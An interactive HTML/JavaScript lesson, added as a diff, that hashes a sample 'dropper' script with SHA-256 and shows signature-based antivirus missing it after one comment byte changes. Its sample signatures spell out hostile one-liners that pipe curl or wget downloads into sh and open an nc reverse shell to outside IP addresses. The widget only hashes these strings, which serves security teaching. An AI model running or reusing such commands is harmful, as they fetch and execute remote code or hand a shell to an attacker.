@@ -1,0 +1,371 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<link rel="stylesheet" href="_shared.css">
+<style>
+  body { padding: 4px 6px; }
+  .lab { display: grid; grid-template-columns: 1fr 316px; gap: 13px; align-items: start; }
+
+  .colhd { font-size: 10.5px; font-weight: 800; letter-spacing: .14em; text-transform: uppercase;
+    color: #8AA1A8; margin: 0 0 7px; display: flex; align-items: center; gap: 7px; }
+  .colhd .n { display: inline-flex; align-items: center; justify-content: center; width: 15px; height: 15px;
+    border-radius: 50%; background: #00567C; color: #fff; font-size: 9px; letter-spacing: 0; }
+
+  /* ---- the file being scanned ---- */
+  .file { border: 1px solid #D3E1E1; border-radius: 11px; background: #fff; overflow: hidden; }
+  .fhead { display: flex; align-items: center; gap: 8px; padding: 7px 11px; background: #EEF3F3;
+    border-bottom: 1px solid #E0E7E8; }
+  .fhead .nm { font-family: "JetBrains Mono", monospace; font-size: 11.5px; font-weight: 700; color: #12333D; }
+  .fhead .sz { font-family: "JetBrains Mono", monospace; font-size: 10px; color: #8AA1A8; margin-left: auto; }
+
+  canvas#bytes { width: 100%; border: 0; border-radius: 0; background: #06232B; }
+
+  .hashrow { display: flex; align-items: center; gap: 8px; padding: 8px 11px; border-top: 1px solid #E0E7E8; }
+  .hashrow .lb { font-size: 10px; font-weight: 800; letter-spacing: .1em; text-transform: uppercase; color: #8AA1A8; }
+  .hashrow .hv { font-family: "JetBrains Mono", monospace; font-size: 13px; font-weight: 700; color: #12333D;
+    letter-spacing: .04em; transition: color 160ms; }
+  .hashrow .hv.flip { color: #D64545; }
+  .hashrow .delta { margin-left: auto; font-family: "JetBrains Mono", monospace; font-size: 10px;
+    color: #D64545; font-weight: 700; opacity: 0; transition: opacity 200ms; }
+  .hashrow .delta.show { opacity: 1; }
+
+  /* ---- verdict banner ---- */
+  .verdict { margin-top: 10px; border-radius: 11px; padding: 11px 14px; display: flex; align-items: center; gap: 11px;
+    border: 1px solid #D3E1E1; background: #fff; min-height: 62px; transition: all 200ms; }
+  .verdict .icon { font-size: 22px; line-height: 1; }
+  .verdict .vt { font-size: 14px; font-weight: 800; letter-spacing: .02em; }
+  .verdict .vs { font-size: 11.5px; color: #5C7880; line-height: 1.4; margin-top: 2px; }
+  .verdict.hit  { border-color: #D64545; background: rgba(214,69,69,.07); }
+  .verdict.hit .vt { color: #C1403f; }
+  .verdict.miss { border-color: #F2D200; background: rgba(242,210,0,.11); }
+  .verdict.miss .vt { color: #8A7500; }
+  .verdict.scan { border-color: #00567C; background: rgba(0,86,124,.06); }
+  .verdict.scan .vt { color: #00567C; }
+
+  /* ---- signature database ---- */
+  .sigdb { border: 1px solid #D3E1E1; border-radius: 11px; background: #fff; overflow: hidden; }
+  .sig { display: grid; grid-template-columns: 1fr auto; gap: 2px 8px; padding: 7px 10px;
+    border-bottom: 1px solid #EEF3F3; align-items: center; transition: background 140ms; }
+  .sig:last-child { border-bottom: 0; }
+  .sig .sn { font-size: 11px; font-weight: 700; color: #12333D; }
+  .sig .sh { grid-column: 1 / -1; font-family: "JetBrains Mono", monospace; font-size: 10px; color: #8AA1A8;
+    letter-spacing: .04em; }
+  .sig .st { font-family: "JetBrains Mono", monospace; font-size: 8.5px; font-weight: 700; letter-spacing: .05em;
+    padding: 2px 6px; border-radius: 999px; background: #EEF3F3; color: #5C7880; }
+  .sig.probe { background: rgba(0,86,124,.07); }
+  .sig.match { background: rgba(214,69,69,.09); }
+  .sig.match .sn { color: #C1403f; }
+  .sig.match .sh { color: #C1403f; }
+  .sig.match .st { background: #D64545; color: #fff; }
+
+  .dbfoot { padding: 7px 10px; background: #F6F8F8; border-top: 1px solid #E0E7E8;
+    font-size: 10px; color: #8AA1A8; line-height: 1.4; }
+  .dbfoot b { color: #5C7880; }
+
+  .ctl { display: flex; gap: 7px; margin-top: 10px; flex-wrap: wrap; align-items: center; }
+  .ctl button { font-size: 12px; padding: 7px 13px; }
+  .hint { font-size: 10.5px; color: #8AA1A8; margin-left: auto; }
+
+  .cap { margin-top: 9px; font-size: 12.5px; color: #42606A; line-height: 1.45; min-height: 34px; }
+  .cap b { color: #00567C; } .cap em { color: #1F8F89; font-style: normal; font-weight: 700; }
+  .cap .dngr { color: #D64545; font-weight: 700; }
+</style>
+</head><body>
+
+<div class="lab">
+  <div>
+    <p class="colhd"><span class="n">1</span> The file on disk — click any byte to change it</p>
+    <div class="file">
+      <div class="fhead">
+        <span class="nm" id="fname">update.sh</span>
+        <span class="sz" id="fsize">48 bytes</span>
+      </div>
+      <canvas id="bytes"></canvas>
+      <div class="hashrow">
+        <span class="lb">SHA-256</span>
+        <span class="hv" id="hash">…</span>
+        <span class="delta" id="delta"></span>
+      </div>
+    </div>
+
+    <div class="verdict" id="verdict">
+      <span class="icon" id="vicon">🛡️</span>
+      <div><div class="vt" id="vtitle">Not scanned yet</div>
+           <div class="vs" id="vsub">Press <b>Scan file</b> to hash it and check it against the signature database.</div></div>
+    </div>
+
+    <div class="ctl">
+      <button class="primary" id="scan">▶ Scan file</button>
+      <button id="mutate">Flip one byte</button>
+      <button id="reset">Reset</button>
+      <span class="hint" id="hint">the scanner reads bytes — nothing else</span>
+    </div>
+
+    <div class="cap" id="cap">This is the dropper recovered from the Majal Store server. Scan it.</div>
+  </div>
+
+  <div>
+    <p class="colhd"><span class="n">2</span> Signature database <span id="dbc" style="margin-left:auto;font-size:9.5px;letter-spacing:.04em;color:#8AA1A8">4 of 91,400,332</span></p>
+    <div class="sigdb" id="sigdb"></div>
+    <div class="dbfoot">A real AV database holds <b>hundreds of millions</b> of hashes. Every one of them
+      describes a file <b>somebody already caught</b>.</div>
+  </div>
+</div>
+
+<script>
+(function () {
+  var C = { ink:"#12333D", bad:"#D64545", petrol:"#00567C", teal:"#1F8F89", turq:"#33D3CB", mute:"#8AA1A8" };
+
+  /* ---- the file: real bytes of a small malicious shell script -------------- */
+  var ORIGINAL = "curl -s 45.147.230.12/x|sh #majal-dropper-v2\n";
+  var bytes = ORIGINAL.split("").map(function (c) { return c.charCodeAt(0); });
+  var mutated = -1;           // index of the byte the learner changed
+
+  /* ---- a REAL SHA-256, so the avalanche is genuine ------------------------- */
+  var K = [0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+           0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+           0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+           0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+           0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+           0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+           0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+           0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
+  function sha256(msg) {
+    var H = [0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
+    var bitLen = msg.length * 8;
+    var m = msg.slice(); m.push(0x80);
+    while (m.length % 64 !== 56) m.push(0);
+    for (var i = 7; i >= 0; i--) m.push(Math.floor(bitLen / Math.pow(2, i * 8)) & 0xff);
+    function rr(x, n) { return ((x >>> n) | (x << (32 - n))) >>> 0; }
+    var w = new Array(64);
+    for (var b = 0; b < m.length; b += 64) {
+      for (var t = 0; t < 16; t++)
+        w[t] = ((m[b+t*4] << 24) | (m[b+t*4+1] << 16) | (m[b+t*4+2] << 8) | m[b+t*4+3]) >>> 0;
+      for (t = 16; t < 64; t++) {
+        var s0 = (rr(w[t-15],7) ^ rr(w[t-15],18) ^ (w[t-15] >>> 3)) >>> 0;
+        var s1 = (rr(w[t-2],17) ^ rr(w[t-2],19) ^ (w[t-2] >>> 10)) >>> 0;
+        w[t] = (((w[t-16] + s0) >>> 0) + ((w[t-7] + s1) >>> 0)) >>> 0;
+      }
+      var a=H[0], bb=H[1], c=H[2], d=H[3], e=H[4], f=H[5], g=H[6], h=H[7];
+      for (t = 0; t < 64; t++) {
+        var S1 = (rr(e,6) ^ rr(e,11) ^ rr(e,25)) >>> 0;
+        var ch = ((e & f) ^ (~e & g)) >>> 0;
+        var t1 = (((h + S1) >>> 0) + ((ch + K[t]) >>> 0) + w[t]) >>> 0;
+        var S0 = (rr(a,2) ^ rr(a,13) ^ rr(a,22)) >>> 0;
+        var mj = ((a & bb) ^ (a & c) ^ (bb & c)) >>> 0;
+        var t2 = (S0 + mj) >>> 0;
+        h = g; g = f; f = e; e = (d + t1) >>> 0;
+        d = c; c = bb; bb = a; a = (t1 + t2) >>> 0;
+      }
+      H[0]=(H[0]+a)>>>0;  H[1]=(H[1]+bb)>>>0; H[2]=(H[2]+c)>>>0; H[3]=(H[3]+d)>>>0;
+      H[4]=(H[4]+e)>>>0;  H[5]=(H[5]+f)>>>0;  H[6]=(H[6]+g)>>>0; H[7]=(H[7]+h)>>>0;
+    }
+    return H.map(function (x) { return ("00000000" + x.toString(16)).slice(-8); }).join("");
+  }
+
+  /* ---- signature DB: name → the sha256 of the exact bytes it describes ----- */
+  var SIGS = [
+    { n: "Trojan.Shell.Downloader.gen", t: "hash", src: "curl -s 185.220.101.44/a|sh #kraken-loader\n" },
+    { n: "Backdoor.Linux.Tsunami.b",    t: "hash", src: "nc -e /bin/sh 91.219.236.18 4444 #tsunami\n" },
+    { n: "Trojan.Shell.Majal.a",        t: "hash", src: ORIGINAL },
+    { n: "Miner.Linux.XMRig.pkg",       t: "hash", src: "wget -qO- pool.hashvault.pro/x|sh #xmrig\n" }
+  ];
+  SIGS.forEach(function (s) {
+    s.h = sha256(s.src.split("").map(function (c) { return c.charCodeAt(0); }));
+  });
+
+  var $ = function (id) { return document.getElementById(id); };
+  var cv = $("bytes"), ctx = cv.getContext("2d");
+  var W = 0, H = 0, COLS = 16, cw = 0, chh = 34, pad = 10;
+  var scanIdx = -1, phase = "idle", raf = null, hitSig = -1, probeSig = -1;
+
+  function fit() {
+    var dpr = window.devicePixelRatio || 1;
+    W = cv.clientWidth || 660;
+    H = Math.ceil(bytes.length / COLS) * chh + pad * 2;
+    cv.style.height = H + "px";
+    cv.width = W * dpr; cv.height = H * dpr;
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    cw = (W - pad * 2) / COLS;
+    draw();
+  }
+  window.addEventListener("resize", fit);
+
+  function cellRect(i) {
+    var r = Math.floor(i / COLS), c = i % COLS;
+    return { x: pad + c * cw, y: pad + r * chh, w: cw, h: chh };
+  }
+
+  function draw() {
+    ctx.clearRect(0, 0, W, H);
+    ctx.fillStyle = "#06232B"; ctx.fillRect(0, 0, W, H);
+    for (var i = 0; i < bytes.length; i++) {
+      var R = cellRect(i), scanned = (phase === "scanning" && i <= scanIdx) || phase === "done";
+      // cell background
+      if (i === mutated)        ctx.fillStyle = "rgba(242,210,0,.22)";
+      else if (scanned)         ctx.fillStyle = "rgba(51,211,203,.10)";
+      else                      ctx.fillStyle = "rgba(255,255,255,.03)";
+      ctx.fillRect(R.x + 1, R.y + 1, R.w - 2, R.h - 2);
+      if (i === mutated) { ctx.strokeStyle = "#F2D200"; ctx.lineWidth = 1.4;
+        ctx.strokeRect(R.x + 1.2, R.y + 1.2, R.w - 2.4, R.h - 2.4); }
+      // hex value
+      ctx.fillStyle = i === mutated ? "#F2D200" : (scanned ? "#7FE3DC" : "#5D8C93");
+      ctx.font = "600 12px 'JetBrains Mono', Menlo, monospace";
+      ctx.textAlign = "center"; ctx.textBaseline = "middle";
+      ctx.fillText(("0" + bytes[i].toString(16)).slice(-2), R.x + R.w / 2, R.y + R.h / 2 - 6);
+      // ascii glyph beneath
+      var ch = bytes[i] >= 32 && bytes[i] < 127 ? String.fromCharCode(bytes[i]) : "·";
+      ctx.fillStyle = i === mutated ? "rgba(242,210,0,.8)" : (scanned ? "rgba(127,227,220,.55)" : "rgba(93,140,147,.55)");
+      ctx.font = "11px 'JetBrains Mono', Menlo, monospace";
+      ctx.fillText(ch, R.x + R.w / 2, R.y + R.h / 2 + 8);
+    }
+    // scan head
+    if (phase === "scanning" && scanIdx >= 0 && scanIdx < bytes.length) {
+      var S = cellRect(scanIdx);
+      ctx.strokeStyle = "#33D3CB"; ctx.lineWidth = 2;
+      ctx.strokeRect(S.x + 1, S.y + 1, S.w - 2, S.h - 2);
+      ctx.shadowColor = "#33D3CB"; ctx.shadowBlur = 8;
+      ctx.strokeRect(S.x + 1, S.y + 1, S.w - 2, S.h - 2);
+      ctx.shadowBlur = 0;
+    }
+  }
+
+  /* ---- hash display, with per-character avalanche highlighting ------------- */
+  var lastHash = "";
+  function shortHash(h) { return h.slice(0, 16) + "…" + h.slice(-4); }
+  function paintHash(h, compareTo) {
+    var el = $("hash");
+    if (!compareTo) { el.textContent = shortHash(h); el.className = "hv"; return; }
+    var a = shortHash(h), b = shortHash(compareTo), out = "";
+    for (var i = 0; i < a.length; i++)
+      out += (a[i] !== b[i]) ? '<span style="color:#D64545">' + a[i] + '</span>' : a[i];
+    el.innerHTML = out; el.className = "hv";
+    var diff = 0;
+    for (i = 0; i < h.length; i++) if (h[i] !== compareTo[i]) diff++;
+    var d = $("delta");
+    d.textContent = diff + "/64 hex digits changed"; d.className = "delta show";
+  }
+
+  function renderDB() {
+    var wrap = $("sigdb"); wrap.innerHTML = "";
+    SIGS.forEach(function (s, i) {
+      var cls = "sig" + (i === hitSig ? " match" : (i === probeSig ? " probe" : ""));
+      var tag = i === hitSig ? "MATCH" : s.t;
+      wrap.innerHTML += '<div class="' + cls + '"><span class="sn">' + s.n + '</span>' +
+        '<span class="st">' + tag + '</span>' +
+        '<span class="sh">' + s.h.slice(0, 28) + '…</span></div>';
+    });
+  }
+
+  function setVerdict(kind, icon, title, sub) {
+    var v = $("verdict"); v.className = "verdict " + kind;
+    $("vicon").textContent = icon; $("vtitle").textContent = title; $("vsub").innerHTML = sub;
+  }
+
+  /* ---- the scan animation -------------------------------------------------- */
+  function scan(instant) {
+    if (phase === "scanning") return;
+    phase = "scanning"; scanIdx = -1; hitSig = -1; probeSig = -1; renderDB();
+    $("scan").disabled = true;
+    setVerdict("scan", "🔎", "Reading bytes…", "The scanner never runs the file. It only reads it.");
+    $("cap").innerHTML = "The engine hashes <b>every byte</b> — a single pass over the file.";
+    if (instant === true) { phase = "done"; scanIdx = bytes.length; draw(); compare(true); return; }
+    var t0 = performance.now(), DUR = 850;
+    function step(now) {
+      var p = Math.min(1, (now - t0) / DUR);
+      scanIdx = Math.floor(p * bytes.length);
+      draw();
+      if (p < 1) { raf = requestAnimationFrame(step); }
+      else { phase = "done"; scanIdx = bytes.length; draw(); compare(false); }
+    }
+    raf = requestAnimationFrame(step);
+  }
+
+  function compare(instant) {
+    var h = sha256(bytes);
+    paintHash(h, mutated >= 0 ? sha256(ORIGINAL.split("").map(function(c){return c.charCodeAt(0);})) : null);
+    // walk the DB, one signature at a time
+    var i = 0;
+    (function next() {
+      if (i >= SIGS.length) {
+        probeSig = -1; renderDB(); $("scan").disabled = false;
+        setVerdict("miss", "⚠️", "CLEAN — no signature matched",
+          "The file is <b>byte-for-byte hostile</b> and the scanner says it is fine. " +
+          "Its hash is not in the database, so as far as AV is concerned this file has never existed.");
+        $("cap").innerHTML = "You changed <span class='dngr'>one byte in a comment</span> — the behaviour is identical, " +
+          "the hash is not. <b>Signature detection catches files it has already seen.</b> Nothing else.";
+        $("hint").textContent = "so how do you catch what nobody has seen yet?";
+        return;
+      }
+      probeSig = i; renderDB();
+      if (SIGS[i].h === h) {
+        hitSig = i; probeSig = -1; renderDB(); $("scan").disabled = false;
+        setVerdict("hit", "🚫", "BLOCKED — Trojan.Shell.Majal.a",
+          "Hash matched a known signature. File quarantined, alert raised, <b>0.4 ms</b> of CPU spent.");
+        $("cap").innerHTML = "That is antivirus: <em>hash the file, look it up</em>. Fast, cheap, and exactly right — " +
+          "as long as somebody, somewhere, has already caught this file. Now press <b>Flip one byte</b>.";
+        $("hint").textContent = "now flip a byte and scan again";
+        return;
+      }
+      i++; if (instant) next(); else setTimeout(next, 110);
+    })();
+  }
+
+  function mutate() {
+    // flip a byte inside the trailing comment — behaviour unchanged, hash changed
+    var idx = ORIGINAL.indexOf("majal-dropper-v2") + 15;   // the "2"
+    bytes[idx] = bytes[idx] === 0x32 ? 0x33 : 0x32;
+    mutated = idx;
+    phase = "idle"; scanIdx = -1; hitSig = -1; probeSig = -1;
+    renderDB(); draw();
+    $("fname").textContent = "update.sh";
+    paintHash(sha256(bytes), sha256(ORIGINAL.split("").map(function(c){return c.charCodeAt(0);})));
+    setVerdict("scan", "✏️", "One byte changed — in a comment",
+      "<b>v2</b> → <b>v3</b> in a comment the shell never executes. The file does <b>exactly</b> the same thing. Scan it again.");
+    $("cap").innerHTML = "Same command. Same server. Same damage. <b>Different hash.</b>";
+    $("hint").textContent = "press Scan file";
+  }
+
+  function reset() {
+    bytes = ORIGINAL.split("").map(function (c) { return c.charCodeAt(0); });
+    mutated = -1; phase = "idle"; scanIdx = -1; hitSig = -1; probeSig = -1;
+    $("delta").className = "delta"; renderDB(); draw();
+    paintHash(sha256(bytes), null);
+    setVerdict("", "🛡️", "Not scanned yet",
+      "Press <b>Scan file</b> to hash it and check it against the signature database.");
+    $("cap").innerHTML = "This is the dropper recovered from the Majal Store server. Scan it.";
+    $("hint").textContent = "the scanner reads bytes — nothing else";
+    $("scan").disabled = false;
+  }
+
+  /* ---- click a byte to edit it -------------------------------------------- */
+  cv.addEventListener("click", function (e) {
+    var r = cv.getBoundingClientRect();
+    var x = e.clientX - r.left, y = e.clientY - r.top;
+    var col = Math.floor((x - pad) / cw), row = Math.floor((y - pad) / chh);
+    var i = row * COLS + col;
+    if (col < 0 || col >= COLS || i < 0 || i >= bytes.length) return;
+    bytes[i] = bytes[i] === 0x41 ? 0x42 : (bytes[i] + 1) % 127;
+    if (bytes[i] < 32) bytes[i] = 32;
+    mutated = i; phase = "idle"; hitSig = -1; probeSig = -1;
+    renderDB(); draw();
+    paintHash(sha256(bytes), sha256(ORIGINAL.split("").map(function(c){return c.charCodeAt(0);})));
+    setVerdict("scan", "✏️", "You edited byte " + i,
+      "The hash moved. Scan again and watch the database miss it.");
+    $("cap").innerHTML = "Every byte you touch produces a <b>completely different hash</b> — that's the avalanche " +
+      "effect from Day 1, and it is what makes signature matching so brittle.";
+  });
+
+  $("scan").addEventListener("click", function () { scan(false); });
+  $("mutate").addEventListener("click", mutate);
+  $("reset").addEventListener("click", reset);
+
+  $("fsize").textContent = bytes.length + " bytes";
+  renderDB(); fit(); paintHash(sha256(bytes), null);
+
+  /* screenshot / presenter hook: ?state=hit | miss */
+  var st = (location.search.match(/state=(\w+)/) || [])[1];
+  if (st === "hit")  { scan(true); }
+  if (st === "miss") { mutate(); scan(true); }
+})();
+</script>
+</body></html>
